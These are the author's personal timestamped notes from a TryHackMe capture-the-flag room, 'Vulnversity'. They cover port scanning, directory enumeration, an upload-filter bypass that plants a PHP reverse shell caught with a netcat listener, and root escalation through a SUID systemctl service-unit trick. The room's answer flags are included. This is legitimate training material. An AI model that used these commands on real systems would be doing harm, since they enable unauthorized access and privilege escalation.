```

vulnversity
https://tryhackme.com/room/vulnversity

IP Address:
10.10.223.235
```
```
1:04 PM 1/7/2023
ping 10.10.223.235
```

```
1:05 PM 1/7/2023
nmap -sC -sV -Pn -oA nmap 10.10.223.235

21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
```

```
1:07 PM 1/7/2023
http://10.10.223.235:3128/
# nothing
```

```
1:08 PM 1/7/2023
http://10.10.223.235:3333
# got vuln university web site

	Ivan Jacobson (CSE TEACHER FOR UNIVERSITY)
```

```	
1:17 PM 1/7/2023 WEB SERVER = DIRB ALWAYS

dirsearch -u http://10.10.223.235:3333 -x 400,401,403
	#vpn keeps dropping

	Target: http://10.10.223.235:3333/

	[18:24:40] Starting: 
	[18:24:42] 301 -  318B  - /js  ->  http://10.10.223.235:3333/js/
	[18:25:24] 301 -  319B  - /css  ->  http://10.10.223.235:3333/css/
	[18:25:30] 301 -  321B  - /fonts  ->  http://10.10.223.235:3333/fonts/
	[18:25:32] 301 -  322B  - /images  ->  http://10.10.223.235:3333/images/
	[18:25:32] 200 -    7KB - /images/
	[18:25:33] 200 -   32KB - /index.html
	[18:25:34] 301 -  324B  - /internal  ->  http://10.10.223.235:3333/internal/
	[18:25:34] 200 -    5KB - /js/

	Task Completed
    
	http://10.10.223.235:3333/internal/
	can upload to this.
```

```	
1:54 PM 1/7/2023
Check what file extensions can be uploaded to the website,

uploaded phpext.phtml file and it worked.
```

```
2:05 PM 1/7/2023
Going to upload reverse shell payload to server
	wget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
	#provided through tryhackme
```

```
2:13 PM 1/7/2023
uploaded file http://10.10.223.235:3333/internal/php-reverse-shell.phtml
nc -lvnp 4444
navigate to file to execute it.
```

```
2:29 PM 1/7/2023
# DOING ANOTHER DIRSEARCH TO IDERTIFY WHERE THE FILE WAS UPLOADED UNDER /INTERNALS DIRECTORY
dirsearch -u http://10.10.223.235:3333/internal/ -x 400,401,403

	Target: http://10.10.223.235:3333/internal/

	[19:27:38] Starting: 
	[19:28:21] 301 -  328B  - /internal/css  ->  http://10.10.223.235:3333/internal/css/
	[19:28:30] 200 -  525B  - /internal/index.php
	[19:28:30] 200 -  525B  - /internal/index.php/login/
	[19:28:54] 301 -  332B  - /internal/uploads  ->  http://10.10.223.235:3333/internal/uploads/
	[19:28:54] 200 -    1KB - /internal/uploads/

	Task Completed
```

```
2:31 PM 1/7/2023
on web server with reverse shell

	$ cd bill
	$ ls
	user.txt
	$ cat user.txt
	8bd7992fbe8a6ad22a63361004cfcedb
```

```
2:35 PM 1/7/2023
$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl ***** IN GTFO BINS
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```

```
2:47 PM 1/7/2023

sudo install -m =xs $(which systemctl) .

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF					#HAD TO ADJUST THESE AND TAKE OUT ./
/bin/systemctl enable --now $TF			#HAD TO ADJUST THESE AND TAKE OUT ./


FLAG:a58ff8579f0a9270368d33a9966c7fd5
```

